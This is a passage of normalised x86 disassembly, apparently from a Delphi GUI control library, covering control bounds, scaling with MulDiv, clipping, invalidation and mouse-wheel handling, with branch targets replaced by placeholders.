mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_445ed4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_445ef8
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_445f20
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_445f44
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_445f68
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_446063
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_40346c
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44606a
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4186ec
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_40346c
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_40346c
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4183f4
sub_446074
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_446bac
mov edx edi
mov eax ebx
call sub_446124
mov edx edi
mov eax ebx
call sub_4479b0
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4460e0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_40403c
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_446124
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_446180
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4461ac
mov edx eax
mov ecx esp
mov eax esi
call sub_416eec
mov edx esp
mov eax ebx
call sub_4465f0
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4461c4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_446168
mov ecx esp
mov edx esi
call sub_416eec
mov edx esp
mov eax ebx
call sub_4465f0
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4461ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44626d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446274
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
sub_44627c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4462a8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4462d4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_4622dc
sub_446304
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_44790c
sub_446380
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_423b9c
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_423bb8
sub_44654c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4465e2
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_420dc4
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_446764
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4043f4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4465e9
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_446794
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_4465f0
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_446638
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
test esi esi
je r-xdata
mov edx ebx
call sub_449ccc
mov edx ebx
mov eax esi
call sub_449bf8
mov eax ebx
call sub_445db8
sub_446684
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_40346c
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_44790c
mov eax edi
mov si 0xffd0
call sub_40346c
sub_44671c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_45a618
mov edx ebx
mov eax esi
call sub_42093c
sub_446740
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_44790c
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_44790c
pop ebx
retn
sub_446764
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4466d8
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_4040d8
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_4466e8
sub_446794
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4467e9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446764
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4043f4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4467f0
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax esi
call sub_4044a8
mov edx eax
mov eax ebx
call sub_446740
sub_446814
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_423af8
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_44790c
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_423af8
mov [ ebx + 0x84 ] eax
sub_44699c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44698c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_443934
mov eax esi
call sub_443934
jmp r-xdata
sub_4469d4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_4185ac
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418440
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_4185cc
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_446bac
mov eax ebx
call sub_45e134
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_40346c
sub_446a54
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_4469d4
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_4469d4
jmp r-xdata
sub_446a78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_446b0e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446b15
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
sub_446b20
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_4185ac
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_418550
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_446104
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446bac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d358
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_446104
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d054
push eax
call InvalidateRect
push ebp
call sub_446b20
pop ecx
test al al
je r-xdata
mov al 0x1
sub_446c48
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_45e10c
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_44790c
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_40346c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446ca0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d358
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d054
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_446d79
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44ae60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44d054
push eax
call ReleaseDC
retn
sub_446e00
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax edi
call sub_447940
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4462a8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406c0c
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_44790c
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_444ab4
sub_446ed4
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_446f10
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_446f5c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_446f88
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_446708
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_4466f4
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402aa0
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402aa0
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_44d054
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_44706c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_4470b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_40346c
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_40346c
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_44717c
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
